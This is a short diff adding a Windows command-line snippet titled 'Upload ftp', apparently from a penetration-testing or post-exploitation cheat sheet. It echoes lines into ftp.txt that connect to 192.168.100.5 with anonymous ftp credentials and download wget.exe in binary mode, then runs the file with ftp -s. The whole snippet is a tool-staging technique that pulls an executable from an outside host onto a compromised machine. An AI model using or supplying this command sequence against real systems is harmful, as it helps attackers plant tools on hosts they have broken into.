@@ -1,0 +1,12 @@
+------------------------------------------
+Upload ftp
+------------------------------------------
+
+echo open 192.168.100.5>>ftp.txt
+echo ftp>>ftp.txt
+echo ftp>>ftp.txt
+echo bin>>ftp.txt
+echo GET wget.exe>>ftp.txt
+echo bye>>ftp.txt
+
+ftp -s:ftp.txt
